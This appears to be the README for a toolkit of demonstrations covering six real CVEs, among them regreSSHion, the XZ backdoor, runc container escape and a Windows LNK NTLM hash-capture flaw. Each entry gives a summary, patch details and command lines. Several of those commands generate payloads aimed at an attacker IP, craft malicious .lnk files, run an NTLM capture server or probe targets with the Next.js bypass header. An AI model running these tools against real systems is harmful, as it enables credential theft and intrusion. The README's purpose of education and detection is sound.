# Phase 13: CVE Demonstration & Testing

**Status:** ✅ Active
**Version:** 1.0.0
**Created:** April 28, 2026
**CVEs:** 6 demonstrations

## Overview

Phase 13 provides structured demonstrations of real-world CVEs. Each module includes:
- Technical vulnerability explanation
- Attack flow visualization
- Working demonstration code
- Detection signatures and guidance
- Mitigation and patch information

⚠️ **WARNING:** Only use on systems you own or have explicit written permission to test.

## Available CVEs

| CVE | Description | Severity | CWE | MITRE | Active Exploit |
|-----|-------------|----------|-----|-------|---------------|
| CVE-2024-6387 | OpenSSH regreSSHion RCE | CRITICAL 8.1 | CWE-362/479 | T1190 | 🔴 YES |
| CVE-2024-1086 | Linux nftables use-after-free LPE | HIGH 7.8 | CWE-416 | T1068 | 🔴 YES |
| CVE-2024-21626 | runc Container Escape (Leaky Vessels) | HIGH 8.6 | CWE-403 | T1611 | No |
| CVE-2024-3094 | XZ Utils Supply Chain Backdoor | CRITICAL 10.0 | CWE-1395 | T1195.002 | 🔴 YES |
| CVE-2025-29927 | Next.js Middleware Auth Bypass | CRITICAL 9.1 | CWE-285 | T1190 | 🔴 YES |
| CVE-2026-32202 | Windows Shell LNK NTLM Hash Capture | MEDIUM 4.3 | CWE-693 | T1187 | 🔴 YES |

## CVE Details

### CVE-2024-6387: OpenSSH regreSSHion RCE

Race condition in OpenSSH's sshd SIGALRM handler allows remote unauthenticated code execution. The signal handler calls async-unsafe functions (syslog, malloc/free) that can corrupt the heap.

**Demo tools:** SSH connection fuzzer, timing analyzer, KEXINIT manipulation, detection signatures

```bash
python cve_2024_6387.py explain          # Attack flow and scenarios
python cve_2024_6387.py scan --target 10.0.0.1  # Check SSH server
python cve_2024_6387.py generate --attacker 10.0.0.100  # Generate test payloads
python cve_2024_6387.py report          # Full audit report
```

**Patches:** OpenSSH 9.8+, LoginGraceTime 0, UsePAM no

### CVE-2024-1086: Linux nftables use-after-free LPE

Use-after-free in `nft_verdict_init()` allows positive verdict values, causing double-free in `nf_tables`. Local attacker can achieve arbitrary kernel read/write → root.

**Demo tools:** nftables rule fuzzer, UAF detector, privilege escalation checker, netlink socket manipulation

```bash
python cve_2024_1086.py explain         # Attack flow
python cve_2024_1086.py scan            # Check kernel version
python cve_2024_1086.py generate        # Generate test nftables rules
python cve_2024_1086.py report          # Audit report
```

**Patches:** Kernel 6.8+, disable unprivileged `CAP_NET_ADMIN`

### CVE-2024-21626: runc Container Escape (Leaky Vessels)

File descriptor leak in runc exec allows container escape. `WORKDIR` set to `/proc/self/fd/` leaked fd → host filesystem access from inside container.

**Demo tools:** Container escape detector, leaked FD scanner, runc version checker, Dockerfile analyzer

```bash
python cve_2024_21626.py explain        # Attack flow
python cve_2024_21626.py scan           # Check runc version and FD leaks
python cve_2024_21626.py generate       # Generate test containers
python cve_2024_21626.py report         # Audit report
```

**Patches:** runc 1.1.12+, Docker 25.0.2+, seccomp profiles

### CVE-2024-3094: XZ Utils Supply Chain Backdoor

Sophisticated supply chain attack: malicious build scripts in xz 5.6.0/5.6.1 injected a backdoor into liblzma that targeted OpenSSH via systemd. The backdoor uses IFUNC resolvers to patch RSA_verify(), allowing Ed448 key holders to bypass SSH authentication.

**Demo tools:** System audit (xz version, liblzma, sshd deps), build script analyzer, test file integrity checker

```bash
python cve_2024_3094.py explain         # Attack flow and supply chain breakdown
python cve_2024_3094.py scan            # Audit system for backdoor indicators
python cve_2024_3094.py scan --source-dir /path/to/xz-source  # Analyze source
python cve_2024_3094.py report          # Audit report
```

**Patches:** xz 5.6.2+, or downgrade to 5.4.x. All major distros issued emergency updates.

### CVE-2025-29927: Next.js Middleware Authorization Bypass

The `x-middleware-subrequest` header bypasses all middleware-based authorization in Next.js. Middleware re-enters when processing internal subrequests, but the header is trusted from external sources.

**Demo tools:** URL scanner with bypass header, payload script generator, middleware configuration analyzer

```bash
python cve_2025_29927.py explain        # Attack flow
python cve_2025_29927.py scan https://app.example.com  # Test target
python cve_2025_29927.py generate https://app.example.com  # Generate test script
python cve_2025_29927.py report         # Audit report
```

**Patches:** Next.js 12.3.5, 13.5.9, 14.2.25, 15.2.3+

### CVE-2026-32202: Windows Shell LNK NTLM Hash Capture

Protection mechanism failure in Windows Shell allows crafted `.lnk` files to trigger outbound NTLM/Kerberos authentication. Zero-click via file share browsing, Search Indexer (SYSTEM), or MSSense.

**Demo tools:** LNK file crafter (MS-SHLLINK spec), NTLM capture server (SMB1/SMB2), hashcat/John format output

```bash
python cve_2026_32202.py generate --attacker 192.168.1.100  # Create .lnk payloads
python cve_2026_32202.py capture --port 445                  # Start hash capture
python cve_2026_32202.py explain                              # Attack flow
python cve_2026_32202.py demo --attacker 192.168.1.100       # Full demo
python cve_2026_32202.py report                               # Report
```

**Patches:** KB5082198, KB5082123, KB5082200, KB5082052, KB5083769 (April 2026 Patch Tuesday)

## Files

```
phase13/
├── README.md                    — This file
├── __init__.py
├── cve_agent.py                 — Unified CVE demo registry and runner
└── cve_demos/
    ├── __init__.py
    ├── cve_2024_6387.py         — OpenSSH regreSSHion RCE
    ├── cve_2024_1086.py          — Linux nftables use-after-free LPE
    ├── cve_2024_21626.py          — runc container escape
    ├── cve_2024_3094.py           — XZ Utils supply chain backdoor
    ├── cve_2025_29927.py           — Next.js middleware bypass
    ├── cve_2026_32202.py           — Windows Shell LNK NTLM capture
    ├── quick_demo.py              — Quick demo for CVE-2026-32202
    └── samples/                   — Pre-generated .lnk sample files
```

## Quick Start

```bash
# List all available CVE demos
python cve_agent.py list

# Run a specific CVE demo
python cve_agent.py run CVE-2024-6387 explain
python cve_agent.py run CVE-2024-3094 scan

# Run individual modules directly
python cve_2024_6387.py explain
python cve_2024_1086.py scan
python cve_2024_21626.py scan --target docker-host
python cve_2024_3094.py scan
python cve_2025_29927.py scan https://target.com
python cve_2026_32202.py demo --attacker 192.168.1.100
```